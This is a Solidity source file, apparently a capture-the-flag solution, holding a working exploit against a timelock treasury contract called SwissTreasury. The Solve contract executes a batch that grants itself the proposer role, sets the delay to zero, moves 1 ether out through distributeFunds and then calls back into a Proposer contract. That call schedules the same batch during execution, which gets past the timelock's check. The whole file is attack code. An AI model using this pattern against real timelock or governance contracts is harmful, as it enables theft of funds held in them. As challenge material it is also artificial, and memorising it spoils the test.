// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.4;

import "./SwissTreasury.sol";

contract Proposer {
    SwissTreasury ins;
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    constructor(SwissTreasury _ins) {
        ins = _ins;
    }

    function propose() public {
        bytes memory GRANT_ROLE = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            PROPOSER_ROLE,
            address(this)
        );
        bytes memory UPDATE_DELAY = abi.encodeWithSignature(
            "updateDelay(uint256)",
            0
        );
        bytes memory DISTRIBUTE_FUNDS = abi.encodeWithSignature(
            "distributeFunds(address,uint256)",
            address(0),
            1 ether
        );
        bytes memory SCHEDULE_BATCH = abi.encodeWithSignature("propose()");

        address[] memory targets = new address[](4);
        targets[0] = address(ins);
        targets[1] = address(ins);
        targets[2] = address(ins);
        targets[3] = address(this);

        uint256[] memory values = new uint256[](4);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;

        bytes[] memory datas = new bytes[](4);
        datas[0] = GRANT_ROLE;
        datas[1] = UPDATE_DELAY;
        datas[2] = DISTRIBUTE_FUNDS;
        datas[3] = SCHEDULE_BATCH;

        bytes32 predecessor = bytes32(0);
        bytes32 salt = bytes32(0);
        uint256 delay = 0;
        ins.scheduleBatch(targets, values, datas, predecessor, salt, delay);
    }
}

contract Solve {
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    constructor(SwissTreasury ins, address proposer) {
        bytes memory GRANT_ROLE = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            PROPOSER_ROLE,
            proposer
        );
        bytes memory UPDATE_DELAY = abi.encodeWithSignature(
            "updateDelay(uint256)",
            0
        );
        bytes memory DISTRIBUTE_FUNDS = abi.encodeWithSignature(
            "distributeFunds(address,uint256)",
            address(0),
            1 ether
        );
        bytes memory SCHEDULE_BATCH = abi.encodeWithSignature("propose()");

        address[] memory targets = new address[](4);
        targets[0] = address(ins);
        targets[1] = address(ins);
        targets[2] = address(ins);
        targets[3] = proposer;

        uint256[] memory values = new uint256[](4);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;

        bytes[] memory datas = new bytes[](4);
        datas[0] = GRANT_ROLE;
        datas[1] = UPDATE_DELAY;
        datas[2] = DISTRIBUTE_FUNDS;
        datas[3] = SCHEDULE_BATCH;

        bytes32 predecessor = bytes32(0);
        bytes32 salt = bytes32(0);
        ins.executeBatch(targets, values, datas, predecessor, salt);
    }
}
